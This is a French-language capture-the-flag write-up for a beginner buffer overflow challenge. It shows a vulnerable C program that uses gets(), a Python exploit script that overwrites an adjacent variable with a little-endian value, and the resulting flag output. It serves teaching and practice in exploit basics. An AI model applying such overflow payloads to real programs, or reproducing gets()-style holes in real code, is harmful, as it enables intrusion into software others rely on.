@@ -1,0 +1,107 @@
+Compte Rendu - Challenge BufferOverFlow (100 points)
+Contexte du Challenge
+Dans ce challenge, un programme vulnérable en C exploite un débordement de buffer pour modifier une variable critique et afficher le flag. Le programme présente le squelette suivant :
+
+int main()
+{
+    int retour;
+    unsigned int a = 0x12345678;
+    char Proposition[12];
+    puts("Tentez votre chance !\n");
+    puts("Entrez votre proposition :");
+    gets(Proposition);
+    fputs("Votre proposition : ", stdout);
+    puts(Proposition);
+
+    if (a == 0x1DECAFE1){
+        // Affichage du flag
+        // ...
+    }
+    else{
+        puts("Perdu ...");
+        // ...
+    }
+    // ...
+}
+
+
+L’objectif est de modifier la valeur de la variable a pour qu’elle passe de 0x12345678 à 0x1DECAFE1. La vulnérabilité provient de l’utilisation de gets(), qui permet de dépasser la taille du buffer Proposition (12 octets) et d’écraser la variable située immédiatement après.
+
+Analyse et Stratégie d’Exploitation
+Après analyse avec Ghidra, il a été constaté que la variable a se trouve immédiatement après le buffer de 12 octets. Pour obtenir le flag, il suffit de :
+
+1.  Remplir le buffer avec 12 octets (par exemple, "A"*12).
+
+2.  Injecter, juste après, la valeur cible 0x1DECAFE1 au format little endian.
+    En little endian, 0x1DECAFE1 se représente par les octets : E1 AF EC 1D.
+
+Ainsi, le payload exploitable est constitué de :
+
+- 12 octets de remplissage : b"AAAAAAAAAAAA"
+- 4 octets de valeur cible (little endian) : b"\xe1\xaf\xec\x1d"
+
+Implémentation de l'Exploit en Python
+Le script Python ci-dessous utilise le module subprocess pour lancer l'exécutable vulnérable et injecter le payload via l'entrée standard :
+
+#!/usr/bin/env python3
+import subprocess
+
+def main():
+    # 12 octets de remplissage pour saturer le buffer
+    filler = b"A" * 12
+
+    # La valeur cible 0x1DECAFE1 en little endian (E1 AF EC 1D)
+    target_value = (0x1DECAFE1).to_bytes(4, byteorder="little")
+
+    # Construit le payload
+    payload = filler + target_value
+
+    print("Payload (hex) : ", payload.hex())
+    print("Payload (raw) : ", payload)
+
+    # Lancer le programme vulnérable (remplacer "vuln.exe" par le nom de l'exécutable fourni)
+    process = subprocess.Popen(
+        ["vuln.exe"],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE
+    )
+
+    # Envoyer le payload via l'entrée standard et récupérer la sortie
+    out, err = process.communicate(payload)
+
+    print("\n=== Output ===")
+    print(out.decode(errors='replace'))
+    if err:
+        print("\n=== Errors ===")
+        print(err.decode(errors='replace'))
+
+if __name__ == "__main__":
+    main()
+
+
+Résultats
+Lors de l'exécution du script, le résultat obtenu est le suivant :
+
+Payload (hex) :  414141414141414141414141e1afec1d
+Payload (raw) :  b'AAAAAAAAAAAA\xe1\xaf\xec\x1d'
+
+=== Output ===
+*********************************************************
+***************   CYBER-LEARNING.FR     *****************
+***************     CTF BY Alanus       *****************
+*********************************************************
+*********************************************************
+
+Tentez votre chance !
+
+Entrez votre proposition :
+Votre proposition : AAAAAAAAAAAA��
+Bravo ! Voici votre flag : EQ1bmw
+
+
+Ce résultat confirme que le débordement de buffer a permis de modifier la variable a et, par conséquent, d'afficher le flag EQ1bmw.
+
+Conclusion
+Ce challenge démontre l'importance de gérer correctement les entrées utilisateur en C. L'utilisation de fonctions non sécurisées comme gets() permet, en cas de débordement, de modifier des variables critiques et de compromettre la sécurité du programme.
+L'exploit a été réalisé en construisant un payload adapté, permettant de modifier la valeur de la variable a et ainsi d'obtenir le flag.
